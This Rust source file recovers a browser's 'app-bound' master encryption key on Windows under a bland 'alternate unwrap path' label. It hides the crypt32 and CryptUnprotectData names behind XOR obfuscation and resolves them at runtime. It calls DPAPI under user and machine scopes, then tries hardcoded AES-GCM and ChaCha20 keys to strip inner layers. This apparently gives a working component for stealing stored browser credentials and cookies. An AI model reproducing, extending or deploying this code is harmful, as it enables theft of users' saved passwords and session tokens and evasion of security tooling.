//! Alternate unwrap path when primary provider is unavailable.

use std::ffi::c_void;
use std::mem;
use std::sync::OnceLock;

#[cfg(windows)]
use windows;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
#[cfg(windows)]
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{HLOCAL, LocalFree},
        Security::Cryptography::CRYPT_INTEGER_BLOB,
        System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
};

const OBF: u8 = 0x4E;
const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;

const ENC_AES: [u8; 32] = [
    0xfd, 0x52, 0x20, 0x6a, 0x54, 0x86, 0x08, 0x3c, 0xc3, 0xe7, 0x8f, 0xb4, 0x8a, 0xdd, 0x28, 0x1f,
    0x81, 0xb5, 0xda, 0x03, 0x5a, 0x74, 0xf6, 0x58, 0x69, 0x25, 0x82, 0x23, 0xee, 0x66, 0x09, 0xc9,
];
const ENC_CHA: [u8; 32] = [
    0xa7, 0xc1, 0x79, 0x99, 0xba, 0xaf, 0xb4, 0x0d, 0x73, 0x57, 0x7e, 0x03, 0x8c, 0x6b, 0xce, 0x0c,
    0x47, 0x40, 0x63, 0x53, 0x30, 0xa4, 0x38, 0x3e, 0x9a, 0x51, 0x3d, 0xc3, 0x46, 0x3c, 0xd8, 0x2e,
];

const ENC_CRYPT32: &[u8] = &[0x2d, 0x3c, 0x37, 0x3e, 0x3a, 0x7d, 0x7c, 0x60, 0x2a, 0x22, 0x22];
const ENC_UNPROTECT: &[u8] = &[
    0x0d, 0x3c, 0x37, 0x3e, 0x3a, 0x1b, 0x20, 0x3e, 0x3c, 0x21, 0x3a, 0x2b, 0x2d, 0x3a, 0x0a, 0x2f,
    0x3a, 0x2f,
];

#[cfg(windows)]
type UnprotectFn = unsafe extern "system" fn(
    *mut windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
    *mut u16,
    *mut windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
    *mut c_void,
    *mut c_void,
    u32,
    *mut windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
) -> i32;

#[cfg(not(windows))]
type UnprotectFn = unsafe extern "system" fn(
    *mut c_void,
    *mut u16,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    u32,
    *mut c_void,
) -> i32;

fn reveal(enc: &[u8]) -> Vec<u8> {
    let mut v: Vec<u8> = enc.iter().map(|&b| b ^ OBF).collect();
    v.push(0);
    v
}

fn key_material(enc: &[u8; 32]) -> [u8; 32] {
    let mut out = [0u8; 32];
    for i in 0..32 {
        out[i] = enc[i] ^ OBF;
    }
    out
}

#[cfg(windows)]
fn resolve_unprotect() -> Option<UnprotectFn> {
    static FN: OnceLock<Option<UnprotectFn>> = OnceLock::new();
    *FN.get_or_init(|| unsafe {
        let module = reveal(ENC_CRYPT32);
        let handle = GetModuleHandleA(PCSTR(module.as_ptr())).ok()?;
        let export = reveal(ENC_UNPROTECT);
        let proc = GetProcAddress(handle, PCSTR(export.as_ptr()))?;
        Some(mem::transmute(proc))
    })
}

#[cfg(not(windows))]
fn resolve_unprotect() -> Option<UnprotectFn> {
    None
}

#[cfg(windows)]
fn unwrap_blob(data: &[u8], flags: u32) -> Option<Vec<u8>> {
    let unprotect = resolve_unprotect()?;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if unprotect(
            &mut input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            flags | CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        ) < 0
        {
            return None;
        }
        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        let _ = LocalFree(HLOCAL(output.pbData as *mut _));
        Some(slice)
    }
}

#[cfg(not(windows))]
fn unwrap_blob(_data: &[u8], _flags: u32) -> Option<Vec<u8>> {
    None
}

fn normalize_material(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() == 32 {
        return Some(data.to_vec());
    }
    if data.len() > 32 {
        let tail = &data[data.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    parse_structured_material(data)
}

fn parse_structured_material(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 8 {
        return None;
    }
    let val_len = u32::from_le_bytes(data[0..4].try_into().ok()?) as usize;
    let mut offset = 4 + val_len;
    if data.len() < offset + 4 {
        return None;
    }
    let key_len = u32::from_le_bytes(data[offset..offset + 4].try_into().ok()?) as usize;
    offset += 4;
    if key_len == 32 && data.len() >= offset + 32 {
        return Some(data[offset..offset + 32].to_vec());
    }
    None
}

fn stream_transform(key: &[u8; 32], iv: &[u8], payload: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || payload.len() < 16 {
        return None;
    }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    cipher.decrypt(Nonce::from_slice(iv), payload).ok()
}

fn alt_stream_transform(key: &[u8; 32], iv: &[u8], payload: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || payload.len() < 16 {
        return None;
    }
    use chacha20poly1305::{aead::Aead as _, ChaCha20Poly1305, KeyInit};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), payload).ok()
}

fn scan_inner_layout(data: &[u8]) -> Option<Vec<u8>> {
    let aes_key = key_material(&ENC_AES);
    let cha_key = key_material(&ENC_CHA);

    for i in 0..data.len().saturating_sub(61) {
        let flag = data[i];
        if flag != 0x01 && flag != 0x02 && flag != 0x03 {
            continue;
        }
        let iv = &data[i + 1..i + 13];
        let ct_start = i + 13;
        if data.len() < ct_start + 48 {
            continue;
        }
        let ciphertext = &data[ct_start..ct_start + 32];
        let tag = &data[ct_start + 32..ct_start + 48];
        let mut payload = ciphertext.to_vec();
        payload.extend_from_slice(tag);

        let pt = match flag {
            0x01 => stream_transform(&aes_key, iv, &payload),
            0x02 => alt_stream_transform(&cha_key, iv, &payload),
            _ => continue,
        };
        if let Some(key) = pt.filter(|k| k.len() == 32) {
            return Some(key);
        }
    }
    None
}

fn extract_material(data: &[u8]) -> Option<Vec<u8>> {
    normalize_material(data).or_else(|| scan_inner_layout(data))
}

fn peel_layers(blob: &[u8]) -> Option<Vec<u8>> {
    let attempts: &[(u32, bool)] = &[(0, false), (CRYPTPROTECT_LOCAL_MACHINE, true)];

    for &(outer_flags, needs_inner) in attempts {
        if let Some(outer) = unwrap_blob(blob, outer_flags) {
            if let Some(key) = extract_material(&outer) {
                return Some(key);
            }
            if needs_inner {
                if let Some(inner) = unwrap_blob(&outer, 0) {
                    if let Some(key) = extract_material(&inner) {
                        return Some(key);
                    }
                }
            }
        }
    }

    if let Some(direct) = unwrap_blob(blob, 0) {
        if let Some(key) = extract_material(&direct) {
            return Some(key);
        }
    }

    None
}

/// Try recovering a 32-byte app-bound master key without the primary provider.
#[cfg(windows)]
pub fn try_decrypt_app_bound(encrypted: &[u8]) -> Option<Vec<u8>> {
    peel_layers(encrypted).and_then(|k| {
        if k.len() == 32 {
            Some(k)
        } else {
            normalize_material(&k)
        }
    })
}

#[cfg(not(windows))]
pub fn try_decrypt_app_bound(_encrypted: &[u8]) -> Option<Vec<u8>> {
    None
}

#[cfg(windows)]
#[allow(dead_code)]
fn _ensure_send() {
    let _ = mem::size_of::<windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB>();
}
